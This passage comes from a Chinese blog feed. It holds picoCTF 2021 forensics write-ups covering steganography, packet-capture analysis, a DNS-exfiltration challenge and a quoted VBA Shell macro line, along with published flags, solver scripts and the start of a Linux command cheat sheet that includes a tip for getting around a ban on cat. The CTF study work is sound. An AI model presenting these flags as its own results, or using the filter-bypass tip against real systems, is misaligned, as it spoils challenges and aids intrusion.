<p>结果如下：<br><img src="https://img-blog.csdnimg.cn/20210113174012340.png" alt="在这里插入图片描述"><br>这样就找到flag了</p>
]]></content>
      <categories>
        <category>web学习</category>
      </categories>
  </entry>
  <entry>
    <title>picoctf forensics</title>
    <url>/2021/05/20/pico21/</url>
    <content><![CDATA[<script src='https://cdn.jsdelivr.net/gh/sviptzk/HexoStaticFile@latest/Hexo/js/mouse_snow.min.js'></script>

<h2 id="Matryoshka-doll"><a href="#Matryoshka-doll" class="headerlink" title="Matryoshka doll"></a>Matryoshka doll</h2><p>题目附件下载：<a href="https://pan.baidu.com/s/1tcH_4VUeuRwD0SHdM-D50w">T0MR</a></p>
<p>明显的套娃题，可以直接扔到kali里边用binwalk分离，一共有4层，之后就能看到flag.txt，去除乱码组合字符就是flag</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">picoctf&#123;e3f378fe6c1ea7f6bc5ac2c3d6801c1f&#125;</span><br></pre></td></tr></table></figure>

<p>也可以用python脚本跑出来flag.txt</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">filename = <span class="string">&quot;dolls.png&quot;</span></span><br><span class="line">extract_dir = <span class="string">&quot;ext&quot;</span></span><br><span class="line">flag = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> flag == <span class="number">0</span>:</span><br><span class="line">	<span class="built_in">print</span>(<span class="string">&quot;\n== Extracting ==\n&quot;</span>)</span><br><span class="line">	os.system(<span class="string">&quot;unzip &#123;&#125; -d &#123;&#125;&quot;</span>.<span class="built_in">format</span>(filename,extract_dir))</span><br><span class="line">    <span class="comment">#执行系统命令 unzip  把文件解压到指定目录里</span></span><br><span class="line">	<span class="keyword">if</span> os.path.exists(extract_dir+<span class="string">&quot;/base_images&quot;</span>):</span><br><span class="line">		os.chdir(extract_dir+<span class="string">&quot;/base_images&quot;</span>)</span><br><span class="line">        <span class="comment">#如果目标路径已存在的话，切换到指定路径</span></span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		os.chdir(extract_dir)</span><br><span class="line">	<span class="keyword">for</span> file <span class="keyword">in</span> os.listdir():</span><br><span class="line">        <span class="comment">#遍历目录中的文件夹，一层一层的查找</span></span><br><span class="line">		<span class="keyword">if</span> file.endswith(<span class="string">&quot;.txt&quot;</span>):</span><br><span class="line">			<span class="built_in">print</span>(<span class="string">&quot;\n== FLAG: &quot;</span>)</span><br><span class="line">			<span class="built_in">print</span>(os.system(<span class="string">&quot;cat &#123;&#125;&quot;</span>.<span class="built_in">format</span>(file)))</span><br><span class="line">			flag = <span class="number">1</span></span><br><span class="line">		<span class="keyword">else</span>:</span><br><span class="line">			filename = file</span><br></pre></td></tr></table></figure>

<p>在kali中运行脚本</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">┌──(hack㉿hack)-[~&#x2F;桌面&#x2F;13]</span><br><span class="line">└─$ python3 1.py                                                         1 ⨯</span><br><span class="line"></span><br><span class="line">&#x3D;&#x3D; Extracting &#x3D;&#x3D;</span><br><span class="line"></span><br><span class="line">Archive:  dolls.png</span><br><span class="line">warning [dolls.png]:  272492 extra bytes at beginning or within zipfile</span><br><span class="line">  (attempting to process anyway)</span><br><span class="line">  inflating: ext&#x2F;base_images&#x2F;2_c.jpg  </span><br><span class="line"></span><br><span class="line">&#x3D;&#x3D; Extracting &#x3D;&#x3D;</span><br><span class="line"></span><br><span class="line">Archive:  2_c.jpg</span><br><span class="line">warning [2_c.jpg]:  187707 extra bytes at beginning or within zipfile</span><br><span class="line">  (attempting to process anyway)</span><br><span class="line">  inflating: ext&#x2F;base_images&#x2F;3_c.jpg  </span><br><span class="line"></span><br><span class="line">&#x3D;&#x3D; Extracting &#x3D;&#x3D;</span><br><span class="line"></span><br><span class="line">Archive:  3_c.jpg</span><br><span class="line">warning [3_c.jpg]:  123606 extra bytes at beginning or within zipfile</span><br><span class="line">  (attempting to process anyway)</span><br><span class="line">  inflating: ext&#x2F;base_images&#x2F;4_c.jpg  </span><br><span class="line"></span><br><span class="line">&#x3D;&#x3D; Extracting &#x3D;&#x3D;</span><br><span class="line"></span><br><span class="line">Archive:  4_c.jpg</span><br><span class="line">warning [4_c.jpg]:  79578 extra bytes at beginning or within zipfile</span><br><span class="line">  (attempting to process anyway)</span><br><span class="line">  inflating: ext&#x2F;flag.txt            </span><br><span class="line"></span><br><span class="line">&#x3D;&#x3D; FLAG: </span><br><span class="line">picoCTF&#123;e3f378fe6c1ea7f6bc5ac2c3d6801c1f&#125;0</span><br></pre></td></tr></table></figure>

<h2 id="Wireshark-doo-dooo-do-doo…"><a href="#Wireshark-doo-dooo-do-doo…" class="headerlink" title="Wireshark doo dooo do doo…"></a>Wireshark doo dooo do doo…</h2><p>流量分析题</p>
<p>用wireshark打开，过滤出http，找到状态码为200OK的包</p>
<p>大多都是加密的包，在靠近底部的部分，出现了一个👇</p>
<p><img src="https://img.vim-cn.com/f4/9f00d0766d02a7400041eabfe86db73b8af78d.png"></p>
<p>右键追踪http流</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">GET &#x2F; HTTP&#x2F;1.1</span><br><span class="line">Host: 18.222.37.134</span><br><span class="line">Connection: keep-alive</span><br><span class="line">Cache-Control: max-age&#x3D;0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;84.0.4147.105 Safari&#x2F;537.36</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3;q&#x3D;0.9</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: en-US,en;q&#x3D;0.9</span><br><span class="line"></span><br><span class="line">HTTP&#x2F;1.1 200 OK</span><br><span class="line">Date: Mon, 10 Aug 2020 01:51:45 GMT</span><br><span class="line">Server: Apache&#x2F;2.4.29 (Ubuntu)</span><br><span class="line">Last-Modified: Fri, 07 Aug 2020 00:45:02 GMT</span><br><span class="line">ETag: &quot;2f-5ac3eea4fcf01&quot;</span><br><span class="line">Accept-Ranges: bytes</span><br><span class="line">Content-Length: 47</span><br><span class="line">Keep-Alive: timeout&#x3D;5, max&#x3D;100</span><br><span class="line">Connection: Keep-Alive</span><br><span class="line">Content-Type: text&#x2F;html</span><br><span class="line"></span><br><span class="line">Gur synt vf cvpbPGS&#123;c33xno00_1_f33_h_qrnqorrs&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><code>Gur synt vf cvpbPGS&#123;c33xno00_1_f33_h_qrnqorrs&#125;</code>很明显的一个凯撒加密，爆破一下即可</p>
<p>得到flag：<code>The flag is picoCTF&#123;p33kab00_1_s33_u_deadbeef&#125;</code></p>
<p>也可以用<a href="https://www.boxentriq.com/code-breaking/rot13">rot13在线解码</a></p>
<h2 id="Milkslap"><a href="#Milkslap" class="headerlink" title="Milkslap"></a>Milkslap</h2><p>题目指向：<a href="http://mercury.picoctf.net:58537/">http://mercury.picoctf.net:58537/</a></p>
<p>打开是个gif图片，看一下源码并没有发现图片的位置</p>
<p>翻看一下css👇</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* source: milkslap-milkslap.scss */</span></span><br><span class="line"><span class="selector-tag">body</span> &#123;</span><br><span class="line">  <span class="attribute">margin</span>: <span class="number">0</span>;</span><br><span class="line">  <span class="attribute">padding</span>: <span class="number">0</span>;</span><br><span class="line">  <span class="attribute">overflow</span>: hidden; &#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-tag">a</span> &#123;</span><br><span class="line">  <span class="attribute">color</span>: inherit; &#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.center</span> &#123;</span><br><span class="line">  <span class="attribute">width</span>: <span class="number">1080px</span>;</span><br><span class="line">  <span class="attribute">height</span>: <span class="number">720px</span>;</span><br><span class="line">  <span class="attribute">margin</span>: <span class="number">0</span> auto; &#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-id">#image</span> &#123;</span><br><span class="line">  <span class="attribute">height</span>: <span class="number">720px</span>;</span><br><span class="line">  <span class="attribute">margin-top</span>: <span class="number">5%</span>;</span><br><span class="line">  <span class="attribute">margin-bottom</span>: <span class="number">20px</span>;</span><br><span class="line">  <span class="attribute">background-image</span>: <span class="built_in">url</span>(<span class="string">concat_v.png</span>);</span><br><span class="line">  <span class="attribute">background-position</span>: <span class="number">0</span> <span class="number">0</span>; &#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-id">#foot</span> &#123;</span><br><span class="line">  <span class="attribute">margin-bottom</span>: <span class="number">5px</span>;</span><br><span class="line">  <span class="attribute">color</span>: <span class="number">#999999</span>; &#125;</span><br><span class="line">  <span class="selector-id">#foot</span> <span class="selector-tag">h1</span> &#123;</span><br><span class="line">    <span class="attribute">font-family</span>: serif;</span><br><span class="line">    <span class="attribute">font-weight</span>: normal;</span><br><span class="line">    <span class="attribute">font-size</span>: <span class="number">1rem</span>;</span><br><span class="line">    <span class="attribute">text-align</span>: center; &#125;</span><br></pre></td></tr></table></figure>

<p>很明显 图片所在的url为 <a href="http://mercury.picoctf.net:58537/concat_v.png">http://mercury.picoctf.net:58537/concat_v.png</a></p>
<p>将图片保存下来，扔到kali中用zsteg查看一下</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">zsteg concat_v.png</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">┌──(hack㉿hack)-[~&#x2F;桌面&#x2F;13]</span><br><span class="line">└─$ zsteg 159.png</span><br><span class="line">imagedata           .. text: &quot;\n\n\n\n\n\n\t\t&quot;</span><br><span class="line">b1,b,lsb,xy         .. text: &quot;picoCTF&#123;imag3_m4n1pul4t10n_sl4p5&#125;\n&quot;</span><br><span class="line">b1,bgr,lsb,xy       .. &lt;wbStego size&#x3D;9706075, data&#x3D;&quot;\xB6\xAD\xB6&#125;\xDB\xB2lR\x7F\xDF\x86\xB7c\xFC\xFF\xBF\x02Zr\x8E\xE2Z\x12\xD8q\xE5&amp;MJ-X:\xB5\xBF\xF7\x7F\xDB\xDFI\bm\xDB\xDB\x80m\x00\x00\x00\xB6m\xDB\xDB\xB6\x00\x00\x00\xB6\xB6\x00m\xDB\x12\x12m\xDB\xDB\x00\x00\x00\x00\x00\xB6m\xDB\x00\xB6\x00\x00\x00\xDB\xB6mm\xDB\xB6\xB6\x00\x00\x00\x00\x00m\xDB&quot;, even&#x3D;true, mix&#x3D;true, controlbyte&#x3D;&quot;[&quot;&gt;</span><br><span class="line">b2,r,lsb,xy         .. file: SoftQuad DESC or font file binary</span><br><span class="line">b2,r,msb,xy         .. file: VISX image file</span><br><span class="line">b2,g,lsb,xy         .. file: VISX image file</span><br><span class="line">b2,g,msb,xy         .. file: SoftQuad DESC or font file binary - version 15722</span><br><span class="line">b2,b,msb,xy         .. text: &quot;UfUUUU@UUU&quot;</span><br><span class="line">b4,r,lsb,xy         .. text: &quot;\&quot;\&quot;\&quot;\&quot;\&quot;#4D&quot;</span><br><span class="line">b4,r,msb,xy         .. text: &quot;wwww3333&quot;</span><br><span class="line">b4,g,lsb,xy         .. text: &quot;wewwwwvUS&quot;</span><br><span class="line">b4,g,msb,xy         .. text: &quot;\&quot;\&quot;\&quot;\&quot;DDDD&quot;</span><br><span class="line">b4,b,lsb,xy         .. text: &quot;vdUeVwweDFw&quot;</span><br><span class="line">b4,b,msb,xy         .. text: &quot;UUYYUUUUUUUU&quot;</span><br></pre></td></tr></table></figure>

<p>得到flag：<code>picoCTF&#123;imag3_m4n1pul4t10n_sl4p5&#125;</code></p>
<p>kali装zsteg root下运行 <code>gem install zsteg</code></p>
<h2 id="tunn3l-v1s10n"><a href="#tunn3l-v1s10n" class="headerlink" title="tunn3l v1s10n"></a>tunn3l v1s10n</h2><p>附件：<a href="https://pan.baidu.com/s/1aSJZUTKFDXgEpaZroVcC1A">T0MR</a>（里边有原图以及修改后的图片</p>
<p><a href="https://en.wikipedia.org/wiki/BMP_file_format">关于bmp</a></p>
<p>大小是1134x306，用010editor打开</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">42 4d 8e 26 2c 00 00 00 00 00 ba d0 00 00 ba d0</span><br><span class="line">00 00 6e 04 00 00 32 01</span><br></pre></td></tr></table></figure>

<p>改为</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">42 4d 8e 26 2c 00 00 00 00 00 36 00 00 00 28 00 </span><br><span class="line">00 00 6e 04 00 00 52 03</span><br></pre></td></tr></table></figure>

<p>大致原理：</p>
<p>扔kali里边</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">└─$ exiftool 1.bmp</span><br><span class="line">ExifTool Version Number         : 12.16</span><br><span class="line">File Name                       : tunn3l_v1s10n_orig.bmp</span><br><span class="line">Directory                       : .</span><br><span class="line">File Size                       : 2.8 MiB</span><br><span class="line">File Modification Date&#x2F;Time     : 2021:05:20 21:37:39+08:00</span><br><span class="line">File Access Date&#x2F;Time           : 2021:05:20 21:43:57+08:00</span><br><span class="line">File Inode Change Date&#x2F;Time     : 2021:05:20 21:43:57+08:00</span><br><span class="line">File Permissions                : rw-------</span><br><span class="line">File Type                       : BMP</span><br><span class="line">File Type Extension             : bmp</span><br><span class="line">MIME Type                       : image&#x2F;bmp</span><br><span class="line">BMP Version                     : Unknown (53434)</span><br><span class="line">Image Width                     : 1134</span><br><span class="line">Image Height                    : 306</span><br><span class="line">Planes                          : 1</span><br><span class="line">Bit Depth                       : 24</span><br><span class="line">Compression                     : None</span><br><span class="line">Image Length                    : 2893400</span><br><span class="line">Pixels Per Meter X              : 5669</span><br><span class="line">Pixels Per Meter Y              : 5669</span><br><span class="line">Num Colors                      : Use BitDepth</span><br><span class="line">Num Important Colors            : All</span><br><span class="line">Red Mask                        : 0x27171a23</span><br><span class="line">Green Mask                      : 0x20291b1e</span><br><span class="line">Blue Mask                       : 0x1e212a1d</span><br><span class="line">Alpha Mask                      : 0x311a1d26</span><br><span class="line">Color Space                     : Unknown (,5%()</span><br><span class="line">Rendering Intent                : Unknown (826103054)</span><br><span class="line">Image Size                      : 1134x306</span><br><span class="line">Megapixels                      : 0.347</span><br></pre></td></tr></table></figure>

<p>发现大小为1134x306</p>
<p>大概就是，得到文件应该有的像素值，据此来调整图片本身的宽和高，以此使图片可正常显示</p>
<p>得到flag：<code>picoCTF&#123;qu1t3_a_v13w_2020&#125;</code></p>
<p>属实有点没看明白是怎么计算出应有的尺寸的。。。</p>
<p>除了计算也可以直接修改图片高度以此发现flag</p>
<p>参考文章：<a href="https://github.com/Dvd848/CTFs/blob/master/2021_picoCTF/tunn3l_v1s10n.md">https://github.com/Dvd848/CTFs/blob/master/2021_picoCTF/tunn3l_v1s10n.md</a></p>
<h2 id="Weird-File-奇怪的文件"><a href="#Weird-File-奇怪的文件" class="headerlink" title="Weird File(奇怪的文件)"></a>Weird File(奇怪的文件)</h2><p>附件: <a href="https://pan.baidu.com/s/1K-PFghHClMcG3m2tm6Aylw">T0MR</a></p>
<p>直接作为压缩包打开开始翻看内容，最终在一个名为 <code>vbaProject.bin</code>的文件里边有这样一句话👇</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Shell(&quot;python -c &#39;print(\&quot;cGljb0NURnttNGNyMHNfcl9kNG5nM3IwdXN9\&quot;)</span><br></pre></td></tr></table></figure>

<p>感觉print出来的是一个base64</p>
<p>解码后得flag <code>picoCTF&#123;m4cr0s_r_d4ng3r0us&#125;</code></p>
<h2 id="Trivial-Flag-Transfer-Protocol"><a href="#Trivial-Flag-Transfer-Protocol" class="headerlink" title="Trivial Flag Transfer Protocol"></a>Trivial Flag Transfer Protocol</h2><p>附件：<a href="https://pan.baidu.com/s/15AcBvftjcW_q71s_4uagfw">T0MR</a></p>
<p>用wireshark打开</p>
<p>左上角  文件–&gt;导出对象–&gt;TFTP  得到👇</p>
<p><img src="https://img.vim-cn.com/da/76fba288fc4c1384c834669df29649b10e2388.png"></p>
<p>点击下边得save all 全部保存下来</p>
<p>Instructions.txt的内容👇</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">GSGCQBRFAGRAPELCGBHEGENSSVPFBJRZHFGQVFTHVFRBHESYNTGENAFSRE.SVTHERBHGNJNLGBUVQRGURSYNTNAQVJVYYPURPXONPXSBEGURCYNA</span><br></pre></td></tr></table></figure>

<p><a href="https://www.boxentriq.com/code-breaking/rot13">rot13</a>解一下得</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">TFTPDOESNTENCRYPTOURTRAFFICSOWEMUSTDISGUISEOURFLAGTRANSFER.FIGUREOUTAWAYTOHIDETHEFLAGANDIWILLCHECKBACKFORTHEPLAN</span><br><span class="line">也就是</span><br><span class="line">TFTP DOESNT ENCRYPT OUR TRAFFIC SO WE MUST DISGUISE OUR FLAG TRANSFER. FIGURE OUT A WAY TO HIDE THE FLAG AND I WILL CHECK BACK FOR THE PLAN</span><br><span class="line">翻译：</span><br><span class="line">TFTP不会加密我们的流量，因此我们必须掩盖我们的flag转移。想出隐藏flag的方法，我会再检查一下该计划</span><br></pre></td></tr></table></figure>

<p>提到了计划也就是plan，查看一下plan内都有啥👇</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">VHFRQGURCEBTENZNAQUVQVGJVGU-QHRQVYVTRAPR.PURPXBHGGURCUBGBF</span><br></pre></td></tr></table></figure>

<p>再次使用<a href="https://www.boxentriq.com/code-breaking/rot13">rot13解密</a></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">IUSEDTHEPROGRAMANDHIDITWITH-DUEDILIGENCE.CHECKOUTTHEPHOTOS</span><br><span class="line"></span><br><span class="line">I USED THE PROGRAM AND HID IT WITH-DUEDILIGENCE. CHECK OUT THE PHOTOS</span><br><span class="line"></span><br><span class="line">我使用了该程序，并及时进行了隐藏。查看照片</span><br></pre></td></tr></table></figure>

<p>那就打开照片看看。感觉这几个照片没什么太大关系，最大可能就是隐写了，</p>
<p>想起来上边的<code>WITH-DUEDILIGENCE</code>可能<code>DUEDILIGENCE</code>就是隐写的密码，这就想到了一个工具<code>steghide</code>.对第三个图片使用这个工具得到一个flag.txt</p>
<p>得到flag：<code>picoCTF&#123;h1dd3n_1n_pLa1n_51GHT_18375919&#125;</code></p>
<p>steghide安装使用参考文章：<a href="https://www.cnblogs.com/pcat/p/5503237.html">https://www.cnblogs.com/pcat/p/5503237.html</a></p>
<h2 id="Wireshark-twoo-twooo-two-twoo…"><a href="#Wireshark-twoo-twooo-two-twoo…" class="headerlink" title="Wireshark twoo twooo two twoo…"></a>Wireshark twoo twooo two twoo…</h2><p>附件：<a href="https://pan.baidu.com/s/1GFcZrY1Kl428DnAQAqxvzw">T0MR</a></p>
<p>用wireshark打开之后，左上角文件–&gt;导出对象–&gt;http  发现一个text/html文件，追踪流得👇</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">GET &#x2F; HTTP&#x2F;1.1</span><br><span class="line">Host: 18.217.1.57</span><br><span class="line">Connection: keep-alive</span><br><span class="line">Cache-Control: max-age&#x3D;0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;84.0.4147.105 Safari&#x2F;537.36</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3;q&#x3D;0.9</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: en-US,en;q&#x3D;0.9</span><br><span class="line"></span><br><span class="line">HTTP&#x2F;1.0 200 OK</span><br><span class="line">Content-Type: text&#x2F;html; charset&#x3D;utf-8</span><br><span class="line">Content-Length: 99</span><br><span class="line">Server: Werkzeug&#x2F;1.0.1 Python&#x2F;3.6.9</span><br><span class="line">Date: Mon, 10 Aug 2020 01:39:16 GMT</span><br><span class="line"></span><br><span class="line">The official Red&#39;s Shrimp and Herring website is still under construction. Please check back later!</span><br></pre></td></tr></table></figure>

<p>save all之后在文件夹里发现了89个flag，显然都不是真的</p>
<p>回到wireshark里边 过滤出dns会看到👇                                                                <a href="https://baike.baidu.com/item/%E5%9F%9F%E5%90%8D%E7%B3%BB%E7%BB%9F/2251573?fromtitle=DNS&fromid=427444&fr=aladdin">关于dns</a></p>
<p><img src="https://img.vim-cn.com/5f/91a04d12eafad3ea864ce82a9273818522b4be.png"></p>
<p>联想一下上边提到的 <code>Red&#39;s Shrimp and Herring website</code></p>
<p>正好出现了<code>reddshrimpandherring.com</code></p>
<p>在kali中</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">└─$ curl http:&#x2F;&#x2F;www.reddshrimpandherring.com</span><br><span class="line">Congrats! Was that tooooo easy?</span><br><span class="line"></span><br><span class="line">Flag: cGljb0NURntmMXNoeV9zMXR1NHRpMG5fc2VsYmF0X3liYm9iX2VsdHRpbH0&#x3D;</span><br><span class="line"></span><br><span class="line">└─$ echo cGljb0NURntmMXNoeV9zMXR1NHRpMG5fc2VsYmF0X3liYm9iX2VsdHRpbH0&#x3D; | base64 -d</span><br><span class="line">picoCTF&#123;f1shy_s1tu4ti0n_selbat_ybbob_elttil&#125;  </span><br></pre></td></tr></table></figure>

<p>得到flag，but这个flag也不对</p>
<p>感觉子域名像是随机字符，再去翻看一下，发现了 <code>18.217.1.57</code>和<code>192.168.38.104</code>之间的流量</p>
<p>对这两个ip的流量中的<code>reddshrimpandherring.com</code>的子域名进行拼接</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cGljb0NU+RntkbnNf+M3hmMWxf+ZnR3X2Rl+YWRiZWVm+fQ&#x3D;&#x3D;</span><br><span class="line">得到</span><br><span class="line">cGljb0NURntkbnNfM3hmMWxfZnR3X2RlYWRiZWVmfQ&#x3D;&#x3D;</span><br><span class="line">└─$ echo cGljb0NURntkbnNfM3hmMWxfZnR3X2RlYWRiZWVmfQ&#x3D;&#x3D;  | base64 -d</span><br><span class="line">picoCTF&#123;dns_3xf1l_ftw_deadbeef&#125;</span><br></pre></td></tr></table></figure>

<h2 id="Surfing-the-Waves（不是很会"><a href="#Surfing-the-Waves（不是很会" class="headerlink" title="Surfing the Waves（不是很会"></a>Surfing the Waves（不是很会</h2><p>附件：<a href="https://pan.baidu.com/s/1EuR1t_-X0oOlUfCtFbiV-w">T0MR</a></p>
<p>得到的音频是1s长的噪音</p>
<p>目的：收集wav的所有振幅发现都是在可打印字符的ascii码范围内</p>
<p>python脚本</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> scipy.io <span class="keyword">import</span> wavfile</span><br><span class="line"></span><br><span class="line">samplerate, data = wavfile.read(<span class="string">&#x27;main.wav&#x27;</span>)</span><br><span class="line"><span class="comment">#加载wav文件内容</span></span><br><span class="line"></span><br><span class="line">rounded_data = []</span><br><span class="line">unique = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> data:</span><br><span class="line">    r = <span class="built_in">round</span>(i, -<span class="number">2</span>)</span><br><span class="line">    <span class="comment">#round() 方法返回浮点数i的四舍五入值</span></span><br><span class="line">    rounded_data.append(r)<span class="comment">#append() 方法用于在列表末尾添加新的对象</span></span><br><span class="line">    <span class="keyword">if</span> r <span class="keyword">in</span> unique:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        unique.append(r)</span><br><span class="line">unique.sort()<span class="comment">#sort() 函数用于对原列表进行排序</span></span><br><span class="line"></span><br><span class="line">flag_hex = []</span><br><span class="line"><span class="keyword">for</span> a <span class="keyword">in</span> rounded_data:</span><br><span class="line">    flag_hex.append(<span class="built_in">hex</span>(unique.index(a))[<span class="number">2</span>:])</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytearray</span>.fromhex(<span class="string">&quot;&quot;</span>.join(flag_hex)).decode())</span><br></pre></td></tr></table></figure>

<p>关于scipy.io.wavfile：</p>
<p><a href="https://www.cnblogs.com/ytxwzqin/p/12124788.html">https://www.cnblogs.com/ytxwzqin/p/12124788.html</a></p>
<p><a href="https://docs.scipy.org/doc/scipy/reference/generated/scipy.io.wavfile.read.html">https://docs.scipy.org/doc/scipy/reference/generated/scipy.io.wavfile.read.html</a></p>
<p>脚本来自：<a href="https://github.com/JeffersonDing/CTF/tree/master/pico_CTF_2021/fnc/surfing_the_waves">https://github.com/JeffersonDing/CTF/tree/master/pico_CTF_2021/fnc/surfing_the_waves</a></p>
<p>得到flag：<code>picoCTF&#123;mU21C_1s_1337_6e0a8181&#125;</code></p>
]]></content>
      <categories>
        <category>比赛复现</category>
      </categories>
  </entry>
  <entry>
    <title>Linux命令 (未完)</title>
    <url>/2021/04/29/linux%E5%91%BD%E4%BB%A4/</url>
    <content><![CDATA[<script src='https://cdn.jsdelivr.net/gh/sviptzk/HexoStaticFile@latest/Hexo/js/mouse_snow.min.js'></script>

<p><font color=#999AAA >简单记录一些做题常用的Linux命令</font></p>
<h3 id="cat-amp-tac"><a href="#cat-amp-tac" class="headerlink" title="cat &amp; tac"></a>cat &amp; tac</h3><p>cat (英文全拼：concatenate) 命令用于连接文件并打印到标准输出设备上。</p>
<p>tac 从最后一行显示，作用类似cat。</p>
<p><img src="https://img-blog.csdnimg.cn/20210329175513222.png" alt="在这里插入图片描述"></p>
<hr style=" border:solid; width:100px; height:1px;" color=#000000 size=1">

<h3 id="more-amp-less"><a href="#more-amp-less" class="headerlink" title="more &amp; less"></a>more &amp; less</h3><p>more 命令类似于 cat ， 不过会以一页一页的形式显示，更方便使用者逐页阅读，按空格（space）键 显示下一页，按b键往回显示，并且还具有搜索字符串的功能。</p>
<p><img src="https://img-blog.csdnimg.cn/20210329175807115.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDU5Nzk2OQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>less 操作和作用类似more。<br>具体操作方式 输入👇来查询</p>
<pre><code>less --help
</code></pre>
<hr style=" border:solid; width:100px; height:1px;" color=#000000 size=1">

<h3 id="head"><a href="#head" class="headerlink" title="head"></a>head</h3><p>head命令可用于查看文件的开头部分的内容，有一个常用的参数 -n 用于显示行数，默认为10，即显示10行。<br><img src="https://img-blog.csdnimg.cn/20210329180408810.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDU5Nzk2OQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<hr style=" border:solid; width:100px; height:1px;" color=#000000 size=1">

<h3 id="tail"><a href="#tail" class="headerlink" title="tail"></a>tail</h3><p>tail命令可用于查看文件的内容，有个常用参数 -f 用来查阅正在改变的日志文件。<br>tail -f filename 会把filename 文件里的最尾部的内容显示在屏幕上，并且不断的刷新，只要filename 更新就可以看到最新的文件内容。<br>若是直接👇</p>
<pre><code>tail filename
</code></pre>
<p>则只会显示最后10行内容<br><img src="https://img-blog.csdnimg.cn/20210329180834566.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDU5Nzk2OQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<hr style=" border:solid; width:100px; height:1px;" color=#000000 size=1">

<h3 id="nl"><a href="#nl" class="headerlink" title="nl"></a>nl</h3><p>nl命令类似于cat，只不过nl会显示行号，是一个比较不常用的命令（cat被ban的话可以试试nl<br><img src="https://img-blog.csdnimg.cn/20210329180933924.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDU5Nzk2OQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<hr style=" border:solid; width:100px; height:1px;" color=#000000 size=1">

<h3 id="sort"><a href="#sort" class="headerlink" title="sort"></a>sort</h3><p>sort命令可以用来将文本内容加以排序。sort可针对文本文件的内容，以行为单位来排序。<br><img src="https://img-blog.csdnimg.cn/20210329181057188.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDU5Nzk2OQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<hr style=" border:solid; width:100px; height:1px;" color=#000000 size=1">

<h3 id="od"><a href="#od" class="headerlink" title="od"></a>od</h3><p>od 命令用于输出文件内容（以八进制形式</p>
<p><img src="https://img-blog.csdnimg.cn/20210329181149574.png" alt="在这里插入图片描述"></p>
<hr style=" border:solid; width:100px; height:1px;" color=#000000 size=1">

<h3 id="awk"><a href="#awk" class="headerlink" title="awk"></a>awk</h3><p>awk 是一种处理文本文件的语言，是一个强大的文本分析工具。【详情请自行baidu，这里只举出简单例子】</p>
<pre><code>awk -va=1 &#39;&#123;print $1,$1+a&#125;&#39; 123.txt
</code></pre>
